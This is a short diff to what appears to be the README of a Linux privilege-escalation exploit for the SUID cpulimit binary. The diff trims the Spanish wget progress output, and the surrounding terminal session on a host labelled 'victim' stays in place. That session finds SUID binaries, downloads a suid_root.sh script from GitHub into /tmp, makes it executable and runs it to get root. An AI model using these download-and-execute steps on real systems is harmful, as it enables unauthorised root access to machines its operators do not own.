@@ -9,17 +9,6 @@ user@victim:~$ find / -perm -4000 2>/dev/null | grep "cpulimit"
 /usr/bin/cpulimit
 user@victim:~$ cd /tmp/
 user@victim:/tmp$ wget https://raw.githubusercontent.com/d4t4s3c/CPULimit-Linux-Privilege-Escalation/master/suid_root.sh
---2020-12-22 08:27:14--  https://raw.githubusercontent.com/d4t4s3c/CPULimit-Linux-Privilege-Escalation/master/suid_root.sh
-Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.132.133
-Conectando con raw.githubusercontent.com (raw.githubusercontent.com)[151.101.132.133]:443... conectado.
-Petición HTTP enviada, esperando respuesta... 200 OK
-Longitud: 635 [text/plain]
-Grabando a: “suid_root.sh”
-
-suid_root.sh                                   100%[=================================================================================================>]     635  --.-KB/s    en 0s      
-
-2020-12-22 08:27:14 (3,33 MB/s) - “suid_root.sh” guardado [635/635]
-
 user@victim:/tmp$ chmod +x suid_root.sh 
 user@victim:/tmp$ ./suid_root.sh 
 
